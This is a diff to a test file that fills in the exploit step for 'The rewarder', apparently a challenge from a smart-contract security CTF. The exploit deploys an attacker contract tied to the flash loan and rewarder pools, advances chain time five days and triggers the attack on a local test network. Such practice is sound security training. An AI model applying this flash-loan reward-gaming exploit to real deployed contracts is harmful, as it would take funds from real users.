@@ -95,8 +95,23 @@ describe("[Challenge] The rewarder", function () {
   });
 
   it("Exploit", async function () {
-    // TODO:
     /** CODE YOUR EXPLOIT HERE */
+    const AttackerRewarderFactory = await ethers.getContractFactory(
+      "AttackerRewarder",
+      attacker
+    );
+    const attackerRewarder = await AttackerRewarderFactory.deploy(
+      TOKENS_IN_LENDER_POOL,
+      this.flashLoanPool.address,
+      this.rewarderPool.address
+    );
+
+    /** mock the time for next round (5 days)
+     * ref: https://learnblockchain.cn/question/55
+     */
+    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+
+    await attackerRewarder.attack();
   });
 
   after(async function () {
